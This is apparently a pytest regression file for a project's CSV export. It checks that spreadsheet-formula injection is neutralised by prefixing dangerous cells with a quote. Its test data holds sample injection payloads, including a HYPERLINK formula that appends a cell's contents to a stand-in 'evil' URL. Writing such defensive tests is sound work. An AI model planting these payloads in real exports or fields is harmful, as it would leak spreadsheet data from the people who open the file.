# Copyright 2026 The Kestrel Authors
# SPDX-License-Identifier: Apache-2.0
"""`kestrel.security.csv_safe`: spreadsheet-formula neutralisation for every
CSV export (regression for formula injection via SaaS display names)."""

from __future__ import annotations

import csv
import io

import pytest
from kestrel.dashboard.export import snapshot_to_csv_bytes
from kestrel.security.csv_safe import csv_safe_cell, csv_safe_row, csv_safe_values


@pytest.mark.parametrize(
    "value",
    ['=HYPERLINK("https://evil/?"&A1,"x")', "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"],
)
def test_formula_looking_cells_are_quoted(value):
    assert csv_safe_cell(value) == "'" + value


@pytest.mark.parametrize("value", ["Alice", "", "a=b", '{"k": 1}', 42, -3, None, 1.5])
def test_other_values_pass_through(value):
    assert csv_safe_cell(value) == value


def test_row_helpers_apply_to_every_cell():
    assert csv_safe_row({"a": "=1", "b": "ok"}) == {"a": "'=1", "b": "ok"}
    assert csv_safe_values(["@x", 1]) == ["'@x", 1]


def test_dashboard_csv_export_neutralises_labels():
    snapshot = {
        "widgets": [
            {"title": "=evil()", "data": {"rows": [{"label": '=HYPERLINK("https://evil")', "value": 3}]}},
        ]
    }

    rows = list(csv.reader(io.StringIO(snapshot_to_csv_bytes(snapshot).decode())))

    assert rows[1] == ["'=evil()", '\'=HYPERLINK("https://evil")', "3"]
